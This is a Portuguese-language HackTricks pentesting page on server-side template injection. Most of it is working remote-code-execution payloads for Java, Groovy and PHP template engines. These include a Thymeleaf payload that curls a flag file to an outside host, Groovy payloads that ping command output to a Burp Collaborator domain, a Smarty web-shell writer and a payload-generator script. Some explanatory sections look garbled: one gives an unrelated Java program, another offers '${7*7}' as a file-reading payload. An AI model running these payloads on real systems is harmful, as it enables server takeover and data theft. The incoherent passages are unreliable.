# SSTI (Server Side Template Injection)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) √© o evento de seguran√ßa cibern√©tica mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a miss√£o de promover conhecimento t√©cnico**, este congresso √© um ponto de encontro fervilhante para profissionais de tecnologia e seguran√ßa cibern√©tica em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## O que √© a inje√ß√£o de modelo no lado do servidor?

Uma inje√ß√£o de modelo no lado do servidor ocorre quando um invasor √© capaz de usar a sintaxe nativa do modelo para injetar uma carga maliciosa em um modelo, que √© ent√£o executado no lado do servidor.

**Motores de modelo** s√£o projetados para **gerar p√°ginas da web** combinando **modelos fixos** com **dados vol√°teis**. Ataques de inje√ß√£o de modelo no lado do servidor podem ocorrer quando a **entrada do usu√°rio** √© concatenada diretamente **em um modelo**, em vez de ser passada como dados. Isso permite que os invasores **injetem diretivas de modelo arbitr√°rias** para manipular o motor de modelo, muitas vezes permitindo que eles assumam **controle completo do servidor**.

Um exemplo de c√≥digo vulner√°vel pode ser visto no seguinte trecho:
```php
$output = $twig->render("Dear " . $_GET['name']);
```
No exemplo anterior, **parte do template** em si est√° sendo **gerada dinamicamente** usando o par√¢metro `GET` chamado `name`. Como a sintaxe do template √© avaliada no servidor, isso potencialmente permite que um atacante insira uma carga √∫til de inje√ß√£o de template no lado do servidor dentro do par√¢metro `name`, da seguinte forma:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
## Construindo um ataque de inje√ß√£o de modelo no lado do servidor

![](../../.gitbook/assets/ssti-methodology-diagram.png)

### Detectar

Assim como qualquer vulnerabilidade, o primeiro passo para a explora√ß√£o √© ser capaz de encontr√°-la. Talvez a abordagem inicial mais simples seja tentar **fuzzar o modelo** injetando uma sequ√™ncia de caracteres especiais comumente usados em express√µes de modelo, como o poliglota **`${{<%[%'"}}%\`.**\
Para verificar se o servidor √© vulner√°vel, voc√™ deve **observar as diferen√ßas** entre a resposta com **dados regulares** no par√¢metro e a **carga √∫til fornecida**.\
Se um **erro for lan√ßado**, ser√° bastante f√°cil descobrir que **o servidor √© vulner√°vel** e at√© mesmo qual **motor est√° sendo executado**. Mas voc√™ tamb√©m pode encontrar um servidor vulner√°vel se estiver **esperando** que ele **reflita** a carga √∫til fornecida e ela **n√£o estiver sendo refletida** ou se houver alguns **caracteres ausentes** na resposta.

**Detectar - Contexto de texto simples**

A entrada fornecida est√° sendo **renderizada e refletida** na resposta. Isso pode ser facilmente **confundido com uma vulnerabilidade** [**XSS**](../xss-cross-site-scripting/) simples, mas √© f√°cil diferenciar se voc√™ tentar definir **opera√ß√µes matem√°ticas** dentro de uma express√£o de modelo:
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
**Detectar - Contexto do c√≥digo**

Nesses casos, a **entrada do usu√°rio** est√° sendo colocada **dentro** de uma **express√£o de modelo**:
```python
engine.render("Hello {{"+greeting+"}}", data)
```
O acesso √† p√°gina pode ser feito atrav√©s da URL: `http://vulnerable-website.com/?greeting=data.username`

Se voc√™ **alterar** o par√¢metro **`greeting`** para um **valor diferente**, a **resposta n√£o conter√° o nome de usu√°rio**, mas se voc√™ acessar algo como: `http://vulnerable-website.com/?greeting=data.username}}hello`, **a resposta conter√° o nome de usu√°rio** (se os caracteres de fechamento da express√£o do modelo forem **`}}`**).\
Se ocorrer um **erro** durante esses testes, ser√° mais f√°cil identificar que o servidor √© vulner√°vel.

### Identificar

Depois de detectar o potencial de inje√ß√£o de modelo, o pr√≥ximo passo √© identificar o mecanismo de modelo utilizado.\
Embora existam muitas linguagens de modelo, muitas delas usam uma sintaxe muito semelhante, escolhida especificamente para n√£o entrar em conflito com os caracteres HTML.

Se voc√™ tiver sorte, o servidor estar√° **imprimindo os erros** e voc√™ poder√° encontrar o **mecanismo** utilizado **dentro** dos erros. Alguns payloads poss√≠veis que podem causar erros:

| `${}`       | `{{}}`       | `<%= %>`        |
| ----------- | ------------ | --------------- |
| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
| `${7*7}`    | `{{7*7}}`    | \`\`            |

Caso contr√°rio, voc√™ precisar√° testar manualmente diferentes payloads espec√≠ficos da linguagem e estudar como eles s√£o interpretados pelo mecanismo de modelo. Uma maneira comum de fazer isso √© injetar opera√ß√µes matem√°ticas arbitr√°rias usando a sintaxe de diferentes mecanismos de modelo. Em seguida, voc√™ pode observar se eles s√£o avaliados com sucesso. Para ajudar nesse processo, voc√™ pode usar uma √°rvore de decis√£o semelhante √† seguinte:

![](<../../.gitbook/assets/image (272).png>)

### Explorar

A primeira etapa ap√≥s encontrar a inje√ß√£o de modelo e identificar o mecanismo de modelo √© ler a documenta√ß√£o. As √°reas-chave de interesse s√£o:

* Se√ß√µes 'Para Autores de Modelo' que abordam a sintaxe b√°sica.
* 'Considera√ß√µes de Seguran√ßa' - √© prov√°vel que quem desenvolveu o aplicativo que voc√™ est√° testando n√£o tenha lido isso, e pode conter algumas dicas √∫teis.
* Listas de m√©todos, fun√ß√µes, filtros e vari√°veis ‚Äã‚Äãinternas.
* Listas de extens√µes/plugins - alguns podem estar habilitados por padr√£o.

Assumindo que nenhum exploit tenha se apresentado, o pr√≥ximo passo √© **explorar o ambiente** para descobrir exatamente o que **voc√™ tem acesso**. Voc√™ pode esperar encontrar tanto **objetos padr√£o** fornecidos pelo mecanismo de modelo, quanto **objetos espec√≠ficos do aplicativo** passados para o modelo pelo desenvolvedor. Muitos sistemas de modelo exp√µem um objeto 'self' ou namespace contendo tudo no escopo, e uma maneira idiom√°tica de listar os atributos e m√©todos de um objeto.

Se n√£o houver um objeto self incorporado, voc√™ ter√° que for√ßar nomes de vari√°veis usando [SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt) e a cole√ß√£o de wordlists do Burp Intruder.

Objetos fornecidos pelo desenvolvedor s√£o particularmente propensos a conter informa√ß√µes sens√≠veis e podem variar entre diferentes modelos dentro de um aplicativo, portanto, esse processo deve ser aplicado idealmente a cada modelo distinto individualmente.

### Ataque

Neste ponto, voc√™ deve ter uma **ideia clara da superf√≠cie de ataque dispon√≠vel** e ser capaz de prosseguir com t√©cnicas tradicionais de auditoria de seguran√ßa, revisando cada fun√ß√£o em busca de vulnerabilidades explor√°veis. √â importante abordar isso no contexto do aplicativo como um todo - algumas fun√ß√µes podem ser usadas para explorar recursos espec√≠ficos do aplicativo. Os exemplos a seguir usar√£o a inje√ß√£o de modelo para acionar a cria√ß√£o arbitr√°ria de objetos, leitura/grava√ß√£o arbitr√°ria de arquivos, inclus√£o remota de arquivos, divulga√ß√£o de informa√ß√µes e escalonamento de privil√©gios.

## Ferramentas

### [Tplmap](https://github.com/epinna/tplmap)
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
## Exploits

### Gen√©rico

Nesta **lista de palavras** voc√™ pode encontrar **vari√°veis definidas** nos ambientes de alguns dos motores mencionados abaixo:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

### Java

**Java - Inje√ß√£o b√°sica**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
**Java - Recuperar as vari√°veis de ambiente do sistema**

Neste exemplo, vamos explorar como recuperar as vari√°veis de ambiente do sistema usando Java. Isso pode ser √∫til durante um teste de penetra√ß√£o para obter informa√ß√µes sobre o ambiente de execu√ß√£o do servidor.

```java
import java.util.Map;

public class EnvironmentVariables {
    public static void main(String[] args) {
        Map<String, String> env = System.getenv();
        for (String key : env.keySet()) {
            System.out.println(key + " = " + env.get(key));
        }
    }
}
```

O c√≥digo acima usa a classe `System` do Java para acessar as vari√°veis de ambiente do sistema. A fun√ß√£o `getenv()` retorna um mapa contendo todas as vari√°veis de ambiente e seus respectivos valores. Em seguida, percorremos o mapa e imprimimos cada chave e valor correspondente.

Ao executar esse c√≥digo, voc√™ ver√° a lista completa das vari√°veis de ambiente do sistema, incluindo informa√ß√µes sens√≠veis, como senhas e chaves de API. √â importante ter cuidado ao lidar com essas informa√ß√µes e garantir que elas n√£o sejam expostas indevidamente.
```java
${T(java.lang.System).getenv()}
```
**Java - Recuperar /etc/passwd**

A inje√ß√£o de modelo no lado do servidor (SSTI - Server-Side Template Injection) √© uma vulnerabilidade que permite a um invasor executar c√≥digo arbitr√°rio no servidor. Neste exemplo, vamos explorar uma vulnerabilidade de SSTI em um aplicativo Java para recuperar o arquivo /etc/passwd.

## Pr√©-requisitos

- Java Development Kit (JDK) instalado
- Um ambiente de desenvolvimento Java, como o Eclipse ou o IntelliJ IDEA

## Passo a passo

1. Identifique a vulnerabilidade de SSTI no aplicativo Java. Isso pode ser feito por meio de an√°lise de c√≥digo ou testes de penetra√ß√£o.

2. Localize o ponto de inje√ß√£o de modelo no c√≥digo-fonte do aplicativo. Isso geralmente ocorre quando o aplicativo usa um mecanismo de modelo que permite a inser√ß√£o de c√≥digo din√¢mico.

3. Crie um payload que execute o comando para recuperar o arquivo /etc/passwd. Por exemplo, em um mecanismo de modelo baseado em express√µes, o payload pode ser algo como `${7*7}`.

4. Injete o payload no ponto de inje√ß√£o de modelo no aplicativo. Isso pode ser feito por meio de entradas de usu√°rio ou manipula√ß√£o de solicita√ß√µes.

5. Execute o aplicativo e observe a resposta. Se o payload for executado com sucesso, voc√™ ver√° o conte√∫do do arquivo /etc/passwd na resposta.

## Medidas preventivas

Para evitar vulnerabilidades de SSTI em aplicativos Java, siga estas pr√°ticas recomendadas:

- Utilize mecanismos de modelo seguros que n√£o permitam a execu√ß√£o de c√≥digo arbitr√°rio.
- Valide e sanitize todas as entradas de usu√°rio antes de us√°-las em express√µes de modelo.
- Mantenha seu aplicativo Java atualizado com as √∫ltimas corre√ß√µes de seguran√ßa.

Lembre-se de que a explora√ß√£o de vulnerabilidades sem permiss√£o √© ilegal e deve ser realizada apenas em sistemas autorizados para fins de teste de penetra√ß√£o.
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

Voc√™ pode testar suas cargas √∫teis em [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legado)`
* `${7*'7'} Nada`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - Bypass de Sandbox**

‚ö†Ô∏è funciona apenas em vers√µes do Freemarker abaixo de 2.3.30
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**Mais informa√ß√µes**

* Na se√ß√£o FreeMarker de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**Mais informa√ß√µes**

* Na se√ß√£o Velocity de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf (Java)

A express√£o de teste t√≠pica para SSTI √© `${7*7}`. Essa express√£o tamb√©m funciona no Thymeleaf. Se voc√™ deseja obter execu√ß√£o de c√≥digo remoto, pode usar uma das seguintes express√µes de teste:

* SpringEL: `${T(java.lang.Runtime).getRuntime().exec('calc')}`
* OGNL: `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`

No entanto, como mencionamos antes, as express√µes s√≥ funcionam em atributos especiais do Thymeleaf. Se for necess√°rio usar uma express√£o em uma localiza√ß√£o diferente no modelo, o Thymeleaf suporta _inlining de express√£o_. Para usar esse recurso, voc√™ deve colocar uma express√£o dentro de `[[...]]` ou `[(...)]` (selecione um ou outro dependendo se voc√™ precisa escapar de s√≠mbolos especiais). Portanto, uma carga √∫til simples de detec√ß√£o de SSTI para o Thymeleaf seria `[[${7*7}]]`.

No entanto, as chances de que a carga √∫til de detec√ß√£o acima funcione s√£o muito baixas. As vulnerabilidades de SSTI geralmente ocorrem quando um modelo √© gerado dinamicamente no c√≥digo. O Thymeleaf, por padr√£o, n√£o permite a cria√ß√£o de modelos dinamicamente gerados e todos os modelos devem ser criados antecipadamente. Portanto, se um desenvolvedor quiser criar um modelo a partir de uma string _na hora_, eles precisariam criar seu pr√≥prio TemplateResolver. Isso √© poss√≠vel, mas acontece muito raramente.

Se olharmos mais a fundo na documenta√ß√£o do mecanismo de modelo do Thymeleaf, encontraremos um recurso interessante chamado _**pr√©-processamento de express√£o**_. As express√µes colocadas entre dois sublinhados duplos (`__...__`) s√£o pr√©-processadas e o resultado do pr√©-processamento √© usado como parte da express√£o durante o processamento regular. Aqui est√° um exemplo oficial da documenta√ß√£o do Thymeleaf:
```java
#{selection.__${sel.code}__}
```
**Exemplo vulner√°vel**
```markup
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>

http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**Mais informa√ß√µes**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Framework Spring (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**Burlar filtros**

M√∫ltiplas express√µes de vari√°veis podem ser usadas, se `${...}` n√£o funcionar, tente `#{...}`, `*{...}`, `@{...}` ou `~{...}`.

* Ler `/etc/passwd`
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* Script personalizado para gera√ß√£o de payload
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**Mais Informa√ß√µes**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Manipula√ß√£o de Visualiza√ß√£o do Spring (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Vers√£o antiga do Pebble ( < vers√£o 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
Nova vers√£o do Pebble:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

O Jinjava √© um mecanismo de modelo de servidor-side escrito em Java. Ele √© usado para renderizar modelos de texto com base em express√µes e l√≥gica condicional. O Jinjava suporta a inje√ß√£o de modelo do lado do servidor (SSTI), que √© uma vulnerabilidade que permite a execu√ß√£o de c√≥digo arbitr√°rio no servidor.

#### Como funciona a inje√ß√£o de modelo do lado do servidor (SSTI)

A inje√ß√£o de modelo do lado do servidor ocorre quando um aplicativo web permite que os usu√°rios insiram c√≥digo de modelo em campos de entrada, que s√£o posteriormente renderizados pelo servidor. Se o servidor n√£o validar ou escapar corretamente esses campos de entrada, um atacante pode inserir c√≥digo malicioso que ser√° executado pelo servidor.

#### Explorando a inje√ß√£o de modelo do lado do servidor (SSTI) com Jinjava

Para explorar a inje√ß√£o de modelo do lado do servidor usando o Jinjava, voc√™ precisa encontrar um campo de entrada que seja renderizado pelo servidor sem valida√ß√£o ou escape adequados. Em seguida, voc√™ pode inserir c√≥digo de modelo malicioso para executar comandos no servidor.

#### Preven√ß√£o da inje√ß√£o de modelo do lado do servidor (SSTI)

Para prevenir a inje√ß√£o de modelo do lado do servidor, √© importante validar e escapar corretamente todos os campos de entrada que s√£o renderizados pelo servidor. Al√©m disso, √© recomend√°vel usar uma biblioteca de modelo segura que tenha recursos de seguran√ßa embutidos para evitar a execu√ß√£o de c√≥digo malicioso.
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjava √© um projeto de c√≥digo aberto desenvolvido pela Hubspot, dispon√≠vel em [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

**Jinjava - Execu√ß√£o de Comandos**

Corrigido por [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**Mais informa√ß√µes**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* Delimitadores de declara√ß√£o `{% %}`
* Delimitadores de express√£o `{{ }}`
* Delimitadores de coment√°rio `{# #}`
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

Pesquise por "com.hubspot.content.hubl.context.TemplateContextRequest" e descubra o [projeto Jinjava no Github](https://github.com/HubSpot/jinjava/).
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the







{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**Mais informa√ß√µes**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Expression Language - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

EL fornece um mecanismo importante para permitir que a camada de apresenta√ß√£o (p√°ginas da web) se comunique com a l√≥gica da aplica√ß√£o (beans gerenciados). O EL √© usado por **v√°rias tecnologias JavaEE**, como a tecnologia JavaServer Faces, a tecnologia JavaServer Pages (JSP) e a Inje√ß√£o de Contextos e Depend√™ncias para Java EE (CDI).\
Verifique a seguinte p√°gina para aprender mais sobre a **explora√ß√£o de interpretadores EL**:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

Este desvio do Security Manager foi retirado deste [**artigo**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/).
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √© o evento de ciberseguran√ßa mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a miss√£o de promover conhecimento t√©cnico**, este congresso √© um ponto de encontro fervilhante para profissionais de tecnologia e ciberseguran√ßa em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**Mais informa√ß√µes**

* Na se√ß√£o Smarty de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
